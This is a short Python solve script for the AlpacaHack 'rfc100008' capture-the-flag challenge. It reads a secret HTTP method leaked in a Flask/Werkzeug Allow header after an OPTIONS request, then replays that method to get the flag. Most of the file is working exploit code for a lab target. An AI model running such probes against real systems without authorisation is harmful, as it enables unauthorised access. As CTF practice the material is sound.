#!/usr/bin/env python3
"""
rfc100008 — AlpacaHack Daily 2026-07-27

app.py registers /rfc100008 for a single secret HTTP method
METHOD = secrets.token_hex(8).upper() (16 hex chars). You can't guess 2^64, but
Flask/Werkzeug answers a disallowed method (and OPTIONS) with an `Allow` header
listing the route's methods — leaking METHOD. Send OPTIONS, read the header,
then issue a request with that method to get the flag.

Usage: python3 solve.py <host> <port>
"""
import socket, sys, re

HOST, PORT = sys.argv[1], int(sys.argv[2])

def req(method: str) -> str:
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.sendall(f"{method} /rfc100008 HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    data = b""
    while True:
        b = s.recv(4096)
        if not b:
            break
        data += b
    s.close()
    return data.decode(errors="replace")

allow = re.search(r"(?im)^Allow:\s*(.+)$", req("OPTIONS"))
methods = [m.strip() for m in allow.group(1).split(",")] if allow else []
secret = next((m for m in methods if re.fullmatch(r"[0-9A-F]{16}", m)), None)
assert secret, f"no secret method in Allow: {methods}"
resp = req(secret)
m = re.search(r"Alpaca\{[^}]*\}", resp)
print(f"method={secret}")
print(m.group(0) if m else resp[-200:])
